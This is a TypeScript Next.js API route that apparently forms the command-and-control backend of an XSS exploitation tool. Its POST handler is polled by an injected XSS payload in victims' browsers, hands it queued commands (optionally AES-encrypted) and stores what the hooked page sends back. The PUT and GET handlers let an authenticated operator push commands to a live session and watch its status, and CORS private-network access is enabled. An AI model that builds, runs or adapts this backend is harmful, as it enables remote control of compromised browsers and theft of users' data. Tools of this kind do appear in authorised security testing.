import { NextRequest, NextResponse } from 'next/server';
import { query, queryOne, generateId } from '@/lib/db';
import { getSession } from '@/lib/auth';
import { corsHeaders } from '@/lib/cors';
import crypto from 'crypto';

interface PersistSession {
    id: string;
    report_id: string;
    last_seen: string;
    pending_command: string | null;
    last_response: string | null;
    last_response_at: string | null;
    session_status: string | null;
}

interface Setting {
    value: string;
}

// Get encryption key from settings
async function getEncryptionKey(): Promise<string | null> {
    try {
        const setting = await queryOne<Setting>(
            'SELECT value FROM settings WHERE key = $1',
            ['persistent_key']
        );
        if (setting?.value && setting.value.length === 64) {
            return setting.value;
        }
        return null;
    } catch {
        return null;
    }
}

// AES-256-CBC Encryption
function encrypt(text: string, keyHex: string): string {
    const key = Buffer.from(keyHex, 'hex');
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return iv.toString('hex') + encrypted;
}

// AES-256-CBC Decryption
function decrypt(ciphertext: string, keyHex: string): string | null {
    try {
        const key = Buffer.from(keyHex, 'hex');
        const iv = Buffer.from(ciphertext.substring(0, 32), 'hex');
        const encrypted = ciphertext.substring(32);
        const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch {
        return null;
    }
}

// Handle CORS preflight
export async function OPTIONS(request: NextRequest) {
    const headers: Record<string, string> = { ...corsHeaders };
    if (request.headers.get('Access-Control-Request-Private-Network')) {
        headers['Access-Control-Allow-Private-Network'] = 'true';
    }
    return new NextResponse(null, { status: 204, headers });
}

// POST - Client polling for commands (called by XSS payload)
export async function POST(request: Request) {
    try {
        const body = await request.json();
        const { rid, response, encrypted, nocrypto, status } = body;

        if (!rid) {
            return NextResponse.json(
                { error: 'Missing report id' },
                { status: 400, headers: corsHeaders }
            );
        }

        const encryptionKey = await getEncryptionKey();

        // Update or create session
        const existing = await queryOne<PersistSession>(
            'SELECT * FROM persistent_sessions WHERE report_id = $1',
            [rid]
        );

        let cmd: string | null = null;

        if (existing) {
            cmd = existing.pending_command;
            
            // If status update (popup_blocked, popup_opened, terminated, etc.)
            if (status) {
                await query(
                    `UPDATE persistent_sessions 
                     SET last_seen = NOW(), session_status = $1
                     WHERE report_id = $2`,
                    [status, rid]
                );
                return NextResponse.json({ ok: true }, { headers: corsHeaders });
            }
            
            // If response is provided, store it (decrypt if encrypted)
            if (response !== undefined) {
                let plainResponse = response;
                
                // Decrypt response if it was encrypted and we have a key
                if (encrypted && encryptionKey) {
                    const decrypted = decrypt(response, encryptionKey);
                    if (decrypted !== null) {
                        plainResponse = decrypted;
                    }
                }
                
                await query(
                    `UPDATE persistent_sessions 
                     SET last_seen = NOW(), pending_command = NULL, 
                         last_response = $1, last_response_at = NOW()
                     WHERE report_id = $2`,
                    [typeof plainResponse === 'string' ? plainResponse : JSON.stringify(plainResponse), rid]
                );
            } else {
                await query(
                    `UPDATE persistent_sessions 
                     SET last_seen = NOW(), pending_command = NULL 
                     WHERE report_id = $1`,
                    [rid]
                );
            }
            
            // Encrypt command ONLY if:
            // 1. We have encryption key configured
            // 2. Client has crypto.subtle available (nocrypto !== true)
            if (cmd && encryptionKey && !nocrypto) {
                cmd = encrypt(cmd, encryptionKey);
            }
            // If nocrypto is true, send command as plain text
        } else {
            const sessionId = generateId();
            await query(
                `INSERT INTO persistent_sessions (id, report_id, last_seen, session_status) 
                 VALUES ($1, $2, NOW(), $3)`,
                [sessionId, rid, status || 'active']
            );
        }

        return NextResponse.json(
            { cmd },
            { headers: corsHeaders }
        );
    } catch (error) {
        console.error('[Persist] Poll error:', error);
        return NextResponse.json(
            { error: 'Internal error' },
            { status: 500, headers: corsHeaders }
        );
    }
}

// PUT - Send command to a session via report_id
export async function PUT(request: Request) {
    try {
        // Auth check - only authenticated users can send commands
        const authSession = await getSession();
        if (!authSession) {
            return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
        }

        const body = await request.json();
        const { report_id, command } = body;

        if (!report_id || !command) {
            return NextResponse.json(
                { error: 'Missing report_id or command' },
                { status: 400 }
            );
        }

        // Check if session exists and is active
        const result = await query<PersistSession>(
            `SELECT *, EXTRACT(EPOCH FROM (NOW() - last_seen)) as diff_seconds 
             FROM persistent_sessions WHERE report_id = $1`,
            [report_id]
        );

        if (result.length === 0) {
            return NextResponse.json(
                { error: 'No session for this report' },
                { status: 404 }
            );
        }

        const persistSession = result[0] as PersistSession & { diff_seconds: number };

        if (persistSession.diff_seconds > 30) {
            return NextResponse.json(
                { error: `Session disconnected (${Math.round(persistSession.diff_seconds)}s ago)` },
                { status: 400 }
            );
        }

        // Queue the command
        await query(
            'UPDATE persistent_sessions SET pending_command = $1 WHERE report_id = $2',
            [command, report_id]
        );

        return NextResponse.json({ success: true });
    } catch (error) {
        console.error('[Persist] Command error:', error);
        return NextResponse.json({ error: 'Internal error' }, { status: 500 });
    }
}

// GET - Get session status for a report
export async function GET(request: Request) {
    try {
        // Auth check - only authenticated users can check session status
        const authSession = await getSession();
        if (!authSession) {
            return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
        }

        const url = new URL(request.url);
        const report_id = url.searchParams.get('report_id');

        if (!report_id) {
            return NextResponse.json({ error: 'Missing report_id' }, { status: 400 });
        }

        // Check if encryption is enabled
        const encryptionKey = await getEncryptionKey();

        // Use PostgreSQL to calculate diff to avoid timezone issues
        const result = await query<PersistSession & { diff_seconds: number }>(
            `SELECT *, EXTRACT(EPOCH FROM (NOW() - last_seen)) as diff_seconds 
             FROM persistent_sessions WHERE report_id = $1`,
            [report_id]
        );

        if (result.length === 0) {
            return NextResponse.json({ 
                connected: false, 
                session: null,
                encrypted: !!encryptionKey 
            });
        }

        const persistSession = result[0];
        const diffSeconds = Math.round(persistSession.diff_seconds);
        const isTerminated = persistSession.session_status === 'terminated';
        const isPopupBlocked = persistSession.session_status === 'popup_blocked';

        return NextResponse.json({
            connected: !isTerminated && diffSeconds <= 15, // 15 seconds timeout (poll is every 3s)
            lastSeen: persistSession.last_seen,
            diffSeconds,
            lastResponse: persistSession.last_response,
            lastResponseAt: persistSession.last_response_at,
            encrypted: !!encryptionKey,
            sessionStatus: persistSession.session_status,
            terminated: isTerminated,
            popupBlocked: isPopupBlocked,
        });
    } catch (error) {
        console.error('[Persist] Status error:', error);
        return NextResponse.json({ error: 'Internal error' }, { status: 500 });
    }
}
